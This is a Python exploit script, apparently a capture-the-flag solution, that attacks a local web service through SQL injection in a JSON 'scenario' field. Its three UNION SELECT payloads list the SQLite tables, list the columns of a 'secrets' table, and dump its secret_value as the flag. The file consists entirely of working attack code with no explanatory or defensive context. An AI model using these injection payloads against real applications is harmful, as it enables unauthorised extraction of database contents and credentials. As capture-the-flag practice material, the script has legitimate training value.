import requests as r

base_target = "http://localhost:5000/"

# -------------------- Getting all tables names ------------------
payload_1 = {
    "name": "Hengker",
    "scenario": "1' UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--"
}

resp1 = r.post(base_target + "test", json=payload_1)

print("-----------------------------##-----------------------------\n")
print("List of Tables:")
print(resp1.json()['message'])
print("\n-----------------------------##-----------------------------\n")


# -------------------- Getting columns names from a table ------------------
table = 'secrets'
payload_2 = {
    "name": "Hengker",
    "scenario": f"1' UNION SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('{table}');--"
}

resp2 = r.post(base_target + "test", json=payload_2)

print(f"List of Column names in table '{table}':")
print(resp2.json()['message'])
print("\n-----------------------------##-----------------------------\n")


# -------------------- Getting data from a table ------------------
table = 'secrets'
column = 'secret_value'
payload_3 = {
    "name": "Hengker",
    "scenario": f"1' UNION SELECT {column} FROM {table};--"
}

resp3 = r.post(base_target + "test", json=payload_3)
flag = resp3.json()['message'][0][0]
print(f"List of data in table '{table}':")
print(resp3.json()['message'])
print("\n-----------------------------##-----------------------------\n")

if flag:
    print("Flag found:", flag)
    print("\n-----------------------------##-----------------------------")